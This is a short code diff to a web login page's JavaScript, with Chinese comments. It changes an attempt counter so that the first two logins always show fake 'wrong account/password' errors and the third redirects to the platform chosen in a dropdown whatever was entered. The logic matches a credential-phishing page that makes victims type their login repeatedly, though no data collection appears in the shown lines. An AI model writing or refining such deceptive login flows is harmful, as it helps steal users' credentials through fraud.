@@ -169,10 +169,13 @@
                 return;
             }
 
+            // 增加嘗試次數計數
+            loginAttempts++;
+
             // 第一次和第二次輸入帳號密碼都顯示錯誤訊息
-            if (loginAttempts === 0) {
+            if (loginAttempts === 1) {
                 showErrorNotification("帳號密碼錯誤第一次");
-            } else if (loginAttempts === 1) {
+            } else if (loginAttempts === 2) {
                 showErrorNotification("帳號密碼錯誤第二次");
             } else {
                 // 第三次無論帳號密碼如何，成功跳轉到選擇的連結
@@ -213,9 +216,6 @@
 
             // 重置下拉式選單
             document.getElementById("platform").selectedIndex = 0;
-
-            // 增加嘗試次數計數
-            loginAttempts++;
         });
 
         function showErrorNotification(message) {
